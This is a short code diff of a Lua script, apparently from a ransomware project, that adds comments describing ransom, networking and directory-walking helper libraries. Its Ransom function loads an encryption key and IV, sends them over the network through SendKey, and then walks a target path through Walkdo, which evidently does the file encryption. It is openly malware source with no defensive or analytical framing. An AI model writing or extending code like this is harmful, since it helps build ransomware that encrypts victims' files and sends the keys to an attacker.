@@ -1,5 +1,20 @@
+--[[
+    ransomlib:
+        bytes_str = hexa_to_bytes
+        hexa_str  = bytes_to_hexa
+    netlib:
+        fd     = connect
+        len    = write(fd, string)
+        string = read(fd, length)
+        close(fd)
+    lsf:
+        file_iterator = dir(path)
+--]]
+
+-- setup ransomlib variables
+-- send the keys in the network
+-- do ransomware stuff
 function Ransom(target, hkey, hiv)
-    -- test the lib and setup key/iv
     ransomlib.key  = ransomlib.hexa_to_bytes(hkey)
     ransomlib.iv   = ransomlib.hexa_to_bytes(hiv)
     ransomlib.hkey = ransomlib.bytes_to_hexa(ransomlib.key)
@@ -10,9 +25,7 @@ function Ransom(target, hkey, hiv)
     print("iv    : "..ransomlib.hiv)
     print("ext   : "..ransomlib.ext)
 
-    -- send the key online
     SendKey(ransomlib.hkey, ransomlib.hiv)
-    -- ransom stuff
     Walkdo(target)
 end
 
